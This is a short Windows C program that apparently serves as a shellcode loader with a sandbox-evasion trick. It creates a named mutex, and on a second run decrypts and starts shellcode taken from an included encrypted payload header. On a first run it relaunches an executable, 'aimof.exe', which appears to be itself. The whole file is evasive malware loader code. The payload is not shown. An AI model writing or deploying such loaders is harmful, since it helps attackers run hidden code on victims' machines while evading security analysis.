#include <windows.h>
#include <stdio.h>
#include "../payload_encrypted/payload.h"

int main(){
    HANDLE mutex;
    mutex = CreateMutex(NULL, TRUE, "booo");
    if (GetLastError() == ERROR_ALREADY_EXISTS){
        decryptShellCode();
        startShellCode();
    }else{
        ShellExecute(NULL, "open", "aimof.exe", NULL, NULL, SW_SHOWNORMAL);
        Sleep(1000);
    }
    return 0;
}